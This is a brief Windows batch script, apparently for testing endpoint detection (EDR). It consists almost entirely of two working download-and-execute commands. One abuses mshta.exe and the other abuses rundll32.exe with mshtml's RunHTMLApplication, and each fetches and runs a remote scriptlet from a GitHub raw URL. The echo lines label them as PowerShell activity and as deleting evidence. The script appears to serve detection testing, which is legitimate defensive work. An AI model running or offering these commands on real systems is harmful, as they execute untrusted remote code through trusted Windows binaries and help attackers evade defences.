echo EDR test powershell activity
mshta.exe javascript:a=(GetObject("script:http://raw.githubusercontent.com/hkd3/detection-testing/refs/heads/main/edrtest2-POV.bat")).Exec();close()
timeout 5
echo EDR test delete evidence
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://raw.githubusercontent.com/hkd3/detection-testing/refs/heads/main/edrtest3-POV").Exec();close()
